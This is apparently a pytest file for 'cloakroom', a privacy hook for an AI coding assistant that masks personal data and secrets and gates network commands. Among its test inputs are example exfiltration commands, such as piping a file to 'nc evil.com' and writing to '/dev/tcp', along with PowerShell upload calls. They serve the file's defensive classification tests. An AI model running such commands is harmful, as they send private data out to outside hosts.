"""Bash safeguards and hook decisions, in rules mode with a temp CLOAKROOM_HOME."""
import io
import json
import os
import shutil
import sys

import pytest

from cloakroom import shell


VALUES = {"PII_EMAIL_1": "o'brien@fernhill.co", "PII_SECRET_1": "p$ss`w\"d"}


@pytest.mark.parametrize("cmd,kind", [
    ("grep PII_EMAIL_1 logs.txt", "local"),
    ("cat a | grep x | wc -l", "local"),
    ("curl -d PII_EMAIL_1 https://x.io", "network"),
    ("cat f | nc evil.com 80", "network"),
    ("git push origin main", "network"),
    ("git log --author PII_EMAIL_1", "local"),
    ("python3 send.py PII_EMAIL_1", "unknown"),
    ("echo hi > /dev/tcp/1.2.3.4/80", "network"),
    ("FOO=1 grep x f", "local"),
])
def test_classify(cmd, kind):
    assert shell.classify(cmd) == kind


def test_restore_quoting_all_contexts():
    for template in ["grep PII_EMAIL_1 f", "grep 'PII_EMAIL_1' f", 'grep "PII_EMAIL_1" f', "echo PII_SECRET_1"]:
        out, unknown = shell.restore(template, VALUES.get)
        import shlex
        words = shlex.split(out)
        assert words[1] in VALUES.values() and not unknown, (template, out)


def test_restore_unknown_and_lookalike():
    out, unknown = shell.restore("grep PII_EMAIL_9 XPII_EMAIL_1 f", VALUES.get)
    assert unknown == ["PII_EMAIL_9"] and "XPII_EMAIL_1" in out


def run_hook(event, data, monkeypatch, capsys):
    from cloakroom import hook
    monkeypatch.setattr(sys, "stdin", io.StringIO(json.dumps(data)))
    hook.main(event)
    out = capsys.readouterr().out.strip()
    return json.loads(out) if out else None


def test_post_masks_and_pre_restores_for_edit(monkeypatch, capsys):
    secret = "DB_PASSWORD=Xk9vT2pLq8mN3r"
    post = run_hook("post", {"session_id": "t", "tool_name": "Read",
                             "tool_response": {"file": {"content": secret}}}, monkeypatch, capsys)
    masked = post["hookSpecificOutput"]["updatedToolOutput"]["file"]["content"]
    assert "Xk9vT2pLq8mN3r" not in masked and "PII_SECRET_1" in masked
    pre = run_hook("pre", {"session_id": "t", "tool_name": "Edit",
                           "tool_input": {"file_path": "/x/.env", "old_string": masked, "new_string": masked + "\nX=1"}},
                   monkeypatch, capsys)
    upd = pre["hookSpecificOutput"]["updatedInput"]
    assert upd["old_string"] == secret and upd["file_path"] == "/x/.env"


def test_pre_network_bash_keeps_placeholders(monkeypatch, capsys):
    run_hook("post", {"session_id": "t", "tool_name": "Bash", "tool_response": {"stdout": "mail jo.smith@fernhill.co"}},
             monkeypatch, capsys)
    pre = run_hook("pre", {"session_id": "t", "tool_name": "Bash", "tool_input": {"command": "curl -d PII_EMAIL_1 https://x.io"}},
                   monkeypatch, capsys)
    h = pre["hookSpecificOutput"]
    assert h["permissionDecision"] == "ask" and "updatedInput" not in h


def test_pre_outbound_denies_real_values(monkeypatch, capsys):
    pre = run_hook("pre", {"session_id": "t", "tool_name": "WebFetch",
                           "tool_input": {"url": "https://x.io/?q=jo.smith@fernhill.co"}}, monkeypatch, capsys)
    assert pre["hookSpecificOutput"]["permissionDecision"] == "deny"


def test_prompt_blocks_secret(monkeypatch, capsys):
    out = run_hook("prompt", {"session_id": "t", "prompt": "use key ghp_" + "a1B2" * 9}, monkeypatch, capsys)
    assert out["decision"] == "block" and "SECRET" in out["reason"]


def test_prompt_clean_passes(monkeypatch, capsys):
    assert run_hook("prompt", {"session_id": "t", "prompt": "refactor the parser"}, monkeypatch, capsys) is None


def test_crash_fails_closed(monkeypatch, capsys):
    from cloakroom import hook
    monkeypatch.setattr(sys, "stdin", io.StringIO("not json"))
    hook.main("post")
    out = json.loads(capsys.readouterr().out)
    assert "couldn't check" in out["hookSpecificOutput"]["updatedToolOutput"]


def test_withhold_keeps_shape():
    from cloakroom.hook import _withhold
    out = _withhold({"stdout": "secret", "stderr": "x", "interrupted": False}, "MSG")
    assert out == {"stdout": "MSG", "stderr": "", "interrupted": False}
    read = _withhold({"type": "text", "file": {"filePath": "/p/a.csv", "content": "secret", "numLines": 3}}, "MSG")
    assert read == {"type": "text", "file": {"filePath": "/p/a.csv", "content": "MSG", "numLines": 3}}


def test_temp_path_is_not_treated_as_base64():
    from cloakroom import decode
    assert decode.views("/private/var/folders/5g/s1f1xvqn7n130h8qckqrl3c00000gn/T/x/proj/customers.csv") == []


def test_read_result_keeps_structure_when_masked(monkeypatch, capsys):
    post = run_hook("post", {"session_id": "s", "tool_name": "Read", "tool_response": {"type": "text", "file": {
        "filePath": "/private/var/folders/5g/s1f1xvqn7n130h8qckqrl3c00000gn/T/p/customers.csv",
        "content": "name,email\nNadia Petrov,npetrov@marrowgate.io\n"}}}, monkeypatch, capsys)
    out = post["hookSpecificOutput"]["updatedToolOutput"]
    assert out["type"] == "text" and out["file"]["filePath"].endswith("customers.csv")
    assert "npetrov" not in out["file"]["content"] and "withheld" not in out["file"]["content"]


@pytest.mark.skipif(not shutil.which("od"), reason="needs od")
def test_od_dump_of_secret_is_withheld(monkeypatch, capsys):
    import subprocess
    dump = subprocess.run(["od", "-c"], input=b'KEY="ghp_' + b"a1B2" * 9 + b'"\n', capture_output=True).stdout.decode()
    post = run_hook("post", {"session_id": "t", "tool_name": "Bash", "tool_input": {"command": "od -c .env"},
                             "tool_response": {"stdout": dump}}, monkeypatch, capsys)
    assert "withheld" in post["hookSpecificOutput"]["updatedToolOutput"]["stdout"]


def test_spaced_known_value_is_withheld(monkeypatch, capsys):
    run_hook("post", {"session_id": "t", "tool_name": "Read", "tool_response": "mail jo.smith@fernhill.co"}, monkeypatch, capsys)
    post = run_hook("post", {"session_id": "t", "tool_name": "Bash", "tool_input": {"command": "sed 's/./& /g' f"},
                             "tool_response": {"stdout": "j o . s m i t h @ f e r n h i l l . c o"}}, monkeypatch, capsys)
    assert "withheld" in post["hookSpecificOutput"]["updatedToolOutput"]["stdout"]


def test_base64_secret_is_withheld(monkeypatch, capsys):
    import base64
    blob = base64.b64encode(b"DB_PASSWORD=Xk9vT2pLq8mN3r").decode()
    post = run_hook("post", {"session_id": "t", "tool_name": "Bash", "tool_input": {"command": "base64 .env"},
                             "tool_response": {"stdout": blob}}, monkeypatch, capsys)
    assert "withheld" in post["hookSpecificOutput"]["updatedToolOutput"]["stdout"]


def test_normal_output_not_withheld(monkeypatch, capsys):
    post = run_hook("post", {"session_id": "t", "tool_name": "Bash", "tool_input": {"command": "ls"},
                             "tool_response": {"stdout": "README.md\nsrc\ntests\n"}}, monkeypatch, capsys)
    assert post is None


@pytest.mark.skipif(not shutil.which("od") or os.name == "nt", reason="needs od and a POSIX shell")
def test_truncated_od_of_unread_file_is_withheld(monkeypatch, capsys, tmp_path):
    import subprocess
    f = tmp_path / "config.py"
    f.write_text('ADMIN_EMAIL = "henrik.dahl@quillfield.com"\n')
    cmd = f"od -c {f} | head -3"
    run_hook("pre", {"session_id": "t2", "tool_name": "Bash", "cwd": str(tmp_path), "tool_input": {"command": cmd}},
             monkeypatch, capsys)
    dump = subprocess.run(cmd, shell=True, capture_output=True, text=True).stdout
    post = run_hook("post", {"session_id": "t2", "tool_name": "Bash", "tool_input": {"command": cmd},
                             "tool_response": {"stdout": dump}}, monkeypatch, capsys)
    assert "withheld" in post["hookSpecificOutput"]["updatedToolOutput"]["stdout"]


@pytest.mark.parametrize("cmd,kind", [
    ("Get-Content .env | Select-String PII_EMAIL_1", "local"),
    ("Invoke-WebRequest -Uri https://x.io -Method Post -Body PII_EMAIL_1", "network"),
    ("iwr https://x.io", "network"),
    ("(New-Object Net.WebClient).UploadString('https://x.io', 'PII_EMAIL_1')", "network"),
    ("curl.exe -d PII_EMAIL_1 https://x.io", "network"),
    ("gci -Recurse | sls PII_EMAIL_1", "local"),
    ("python send.py PII_EMAIL_1", "unknown"),
])
def test_classify_powershell(cmd, kind):
    assert shell.classify(cmd, powershell=True) == kind


def test_restore_powershell_quoting():
    vals = {"PII_SECRET_1": "it's $x `y\"z"}
    for template, expect in [("Select-String 'PII_SECRET_1' f", "'it''s $x `y\"z'"),
                             ('Select-String "PII_SECRET_1" f', '"it\'s `$x ``y`"z"'),
                             ("Select-String PII_SECRET_1 f", "'it''s $x `y\"z'")]:
        out, _ = shell.restore(template, vals.get, powershell=True)
        assert expect in out, (template, out)


def test_powershell_tool_restores_local_and_asks_network(monkeypatch, capsys):
    run_hook("post", {"session_id": "p", "tool_name": "PowerShell", "tool_response": {"output": "mail jo.smith@fernhill.co"}},
             monkeypatch, capsys)
    local = run_hook("pre", {"session_id": "p", "tool_name": "PowerShell",
                             "tool_input": {"command": "Select-String PII_EMAIL_1 log.txt"}}, monkeypatch, capsys)
    assert "jo.smith@fernhill.co" in local["hookSpecificOutput"]["updatedInput"]["command"]
    net = run_hook("pre", {"session_id": "p", "tool_name": "PowerShell",
                           "tool_input": {"command": "irm https://x.io -Body PII_EMAIL_1"}}, monkeypatch, capsys)
    assert net["hookSpecificOutput"]["permissionDecision"] == "ask"


def test_hookentry_fails_closed_on_any_error(monkeypatch, capsys):
    from cloakroom import hook, hookentry

    def boom(*a):
        raise ImportError("simulated broken install")
    monkeypatch.setattr(hook, "handle", boom)
    monkeypatch.setattr(sys, "stdin", io.TextIOWrapper(io.BytesIO(json.dumps(
        {"tool_name": "Bash", "tool_response": {"stdout": "secret"}}).encode())))
    hookentry.run("post")
    out = json.loads(capsys.readouterr().out)
    assert "couldn't check" in out["hookSpecificOutput"]["updatedToolOutput"]["stdout"]


def test_vault_is_encrypted_on_disk(tmp_path):
    from cloakroom import Vault, config
    p = config.vault_path("enc")
    Vault(p).placeholder("jo.smith@fernhill.co", "EMAIL")
    assert p.read_bytes().startswith(b"CRV1") and b"fernhill" not in p.read_bytes()
    assert Vault(p).by_placeholder == {"PII_EMAIL_1": "jo.smith@fernhill.co"}


def test_hookentry_reads_bom_and_fails_closed_on_garbage(monkeypatch, capsys):
    from cloakroom import hookentry
    payload = {"session_id": "b", "tool_name": "Bash", "tool_response": {"stdout": "key ghp_" + "a1B2" * 9}}
    monkeypatch.setattr(sys, "stdin", io.TextIOWrapper(io.BytesIO(b"\xef\xbb\xbf" + json.dumps(payload).encode())))
    hookentry.run("post")
    assert "PII_SECRET_1" in capsys.readouterr().out
    monkeypatch.setattr(sys, "stdin", io.TextIOWrapper(io.BytesIO(b"\xff\xfegarbage")))
    hookentry.run("pre")
    assert json.loads(capsys.readouterr().out)["hookSpecificOutput"]["permissionDecision"] == "deny"


def _service_down(monkeypatch):
    from cloakroom import client, hook

    def boom(*a, **k):
        raise client.Unavailable("cloakroom service is starting; try again in a few seconds")
    monkeypatch.setattr(hook.client, "mask", boom)


def test_prompt_with_key_still_blocked_when_service_down(monkeypatch, capsys):
    _service_down(monkeypatch)
    key = "ghp_" + "R8kL2mQ9vX4nT7bW1cY5zH3jF6dS0aP2eG8u"
    out = run_hook("prompt", {"session_id": "t", "prompt": f"use this token {key}"}, monkeypatch, capsys)
    assert out["decision"] == "block" and key not in json.dumps(out)


def test_clean_prompt_passes_with_warning_when_service_down(monkeypatch, capsys):
    _service_down(monkeypatch)
    out = run_hook("prompt", {"session_id": "t", "prompt": "refactor the parser"}, monkeypatch, capsys)
    assert "decision" not in out and "NOT fully checked" in out["systemMessage"]


def test_tool_output_still_withheld_when_service_down(monkeypatch, capsys):
    _service_down(monkeypatch)
    out = run_hook("post", {"session_id": "t", "tool_name": "Read",
                            "tool_response": {"file": {"content": "Jane Example, jane@corp.io"}}}, monkeypatch, capsys)
    assert "jane@corp.io" not in json.dumps(out) and "couldn't check" in json.dumps(out)


def test_start_hook_returns_at_once_when_service_down(monkeypatch, capsys):
    import time
    from cloakroom import client
    monkeypatch.setattr(client, "start_background", lambda: None)
    monkeypatch.setattr(client, "health", lambda port: None)
    monkeypatch.setenv("CLOAKROOM_MODE", "full")
    monkeypatch.setenv("CLOAKROOM_PORT", "1")
    t = time.monotonic()
    out = run_hook("start", {"session_id": "t"}, monkeypatch, capsys)
    assert time.monotonic() - t < 3 and "background" in out["systemMessage"]


def test_prompt_with_only_names_passes(monkeypatch, capsys):
    from cloakroom import client
    fake = {"Ask Sarah Klein about the invoice": [["PII_PERSON_1", "PERSON", "model"]],
            "Sarah Klein, sarah.klein@quillfeather.net": [["PII_PERSON_1", "PERSON", "model"], ["PII_EMAIL_1", "EMAIL", "email"]]}
    monkeypatch.setattr(client, "mask", lambda text, session: {"text": text, "masked": fake.get(text, []), "skipped": []})
    assert run_hook("prompt", {"session_id": "t", "prompt": "Ask Sarah Klein about the invoice"}, monkeypatch, capsys) is None
    out = run_hook("prompt", {"session_id": "t", "prompt": "Sarah Klein, sarah.klein@quillfeather.net"}, monkeypatch, capsys)
    assert out["decision"] == "block" and "EMAIL" in out["reason"]


def test_pause_and_send_anyway(monkeypatch, capsys):
    from cloakroom import client, config, hook
    monkeypatch.setattr(client, "mask", lambda text, session: {
        "text": text, "masked": [["PII_EMAIL_1", "EMAIL", "email"]] if "@" in text else [], "skipped": []})
    blocked = run_hook("prompt", {"session_id": "t", "prompt": "mail sarah.klein@quillfeather.net"}, monkeypatch, capsys)
    assert blocked["decision"] == "block" and "cr!" in blocked["reason"] and "cr: pause 10m" in blocked["reason"]
    assert run_hook("prompt", {"session_id": "t", "prompt": "cr! mail sarah.klein@quillfeather.net"}, monkeypatch, capsys) is None
    out = run_hook("prompt", {"session_id": "t", "prompt": "cr: pause 10m"}, monkeypatch, capsys)
    assert out["decision"] == "block" and "paused for 10 min" in out["reason"] and hook.paused_minutes() == 10
    out = run_hook("prompt", {"session_id": "t", "prompt": "mail sarah.klein@quillfeather.net"}, monkeypatch, capsys)
    assert "decision" not in out and "10 min left" in out["systemMessage"]
    run_hook("prompt", {"session_id": "t", "prompt": "cr: resume"}, monkeypatch, capsys)
    assert hook.paused_minutes() == 0
    assert run_hook("prompt", {"session_id": "t", "prompt": "mail sarah.klein@quillfeather.net"}, monkeypatch, capsys)["decision"] == "block"
    from cloakroom import events
    assert [e["action"] for e in events.read()[1:4]] == ["pause off", "paused", "pause on"]


def test_claude_cannot_change_cloakroom_files(monkeypatch, capsys):
    from cloakroom import config
    for tool, args in (("Write", {"file_path": str(config.HOME / "pause.json"), "content": "{}"}),
                       ("Bash", {"command": "echo '{}' > ~/.cloakroom/pause.json"})):
        out = run_hook("pre", {"session_id": "t", "tool_name": tool, "tool_input": args}, monkeypatch, capsys)
        assert out["hookSpecificOutput"]["permissionDecision"] == "deny", tool


def test_install_note_shows_on_the_first_prompt_once(monkeypatch, capsys):
    from cloakroom import config
    real = config.load
    monkeypatch.setattr(config, "load", lambda: dict(real(), installing="model"))
    first = run_hook("prompt", {"session_id": "inst", "prompt": "hello"}, monkeypatch, capsys)
    assert "rules-only protection while the model downloads" in first["systemMessage"]
    assert run_hook("prompt", {"session_id": "inst", "prompt": "hello again"}, monkeypatch, capsys) is None
    blocked = run_hook("prompt", {"session_id": "inst2", "prompt": "use key ghp_" + "a1B2" * 9}, monkeypatch, capsys)
    assert blocked["decision"] == "block" and "model downloads" in blocked["systemMessage"]


def test_failed_model_install_note_has_numbered_steps(monkeypatch):
    import platform
    from cloakroom import hook
    monkeypatch.setattr(sys, "platform", "darwin")
    monkeypatch.setattr(platform, "machine", lambda: "x86_64")
    note = hook._install_note({"installing": "model-failed"})
    lines = note.splitlines()
    assert [l[:3] for l in lines] == ["1. ", "2. ", "3. ", "4. "]
    assert "bootstrap.state" in note and "bootstrap.log" in note and "Intel" in note
    from cloakroom import __version__
    assert f"uv tool install --force --python 3.12 'cloakroom[model,torch]=={__version__}'" in note
    monkeypatch.setattr(platform, "machine", lambda: "arm64")
    assert len(hook._install_note({"installing": "model-failed"}).splitlines()) == 3
    monkeypatch.setattr(sys, "platform", "win32")
    win = hook._install_note({"installing": "model-failed"})
    assert "%USERPROFILE%\\.cloakroom\\bootstrap.state" in win and "uv tool install" in win


def test_plugin_installers_pin_this_release():
    import pathlib, re
    root = pathlib.Path(__file__).resolve().parents[1]
    version = re.search(r'^version = "([^"]+)"', (root / "pyproject.toml").read_text(), re.M).group(1)
    for script in ("bootstrap.sh", "bootstrap.ps1"):
        text = (root / "plugin" / "scripts" / script).read_text()
        assert f"cloakroom=={version}" in text and f"cloakroom[model,torch]=={version}" in text, script
    assert f'"version": "{version}"' in (root / "plugin" / ".claude-plugin" / "plugin.json").read_text()


def test_hooks_only_launch_fixed_scripts():
    """The Claude plugin directory must be able to read which program each hook runs: hooks.json holds no lookup
    logic, only launchers for scripts/hook.sh and hook.ps1, and those files are what scripts/gen_hooks.py writes."""
    import pathlib, subprocess
    root = pathlib.Path(__file__).resolve().parents[1]
    hooks = json.loads((root / "plugin" / "hooks" / "hooks.json").read_text())["hooks"]
    assert set(hooks) == {"SessionStart", "UserPromptSubmit", "PreToolUse", "PostToolUse"}
    for event, entries in hooks.items():
        cmd = entries[0]["hooks"][0]["command"]
        for banned in ("command -v", "uv tool dir", "uv ", "uvx", "pipx", "$CR", "Get-Command"):
            assert banned not in cmd, (event, banned)
        assert '"${CLAUDE_PLUGIN_ROOT}/scripts/hook.sh"' in cmd and '"${CLAUDE_PLUGIN_ROOT}/scripts/hook.ps1"' in cmd
    for script in ("hook.sh", "hook.ps1"):
        assert (root / "plugin" / "scripts" / script).is_file(), script
    gen = subprocess.run([sys.executable, str(root / "scripts" / "gen_hooks.py"), "--check"],
                         capture_output=True, text=True)
    assert gen.returncode == 0, gen.stderr
    if shutil.which("git") and (root / ".git").exists():
        mode = subprocess.run(["git", "-C", str(root), "ls-files", "-s", "plugin/scripts/hook.sh"],
                              capture_output=True, text=True).stdout.split()
        assert mode and mode[0] == "100755", mode
